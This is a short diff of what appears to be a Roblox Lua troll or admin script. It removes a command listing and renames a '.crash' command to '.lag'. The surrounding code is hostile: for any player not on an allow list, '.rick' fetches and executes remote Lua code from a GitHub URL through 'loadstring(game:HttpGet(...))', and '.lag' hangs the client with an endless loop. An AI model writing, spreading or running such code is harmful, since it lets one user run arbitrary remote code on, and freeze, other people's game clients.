@@ -10474,8 +10474,6 @@ local commands = {
 			end
 		end
 	end,
-	[".cmds"] = function()
-	print(".rick .void .kick .why .freeze .thaw .bye .show .lagback .crash")
 	[".rick"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/ProReleased/ProReleased/main/Rick"))()
@@ -10504,7 +10502,7 @@ local commands = {
 			end
 		end
 	end,
-	[".crash"] = function()
+	[".lag"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			while true do end
 		end
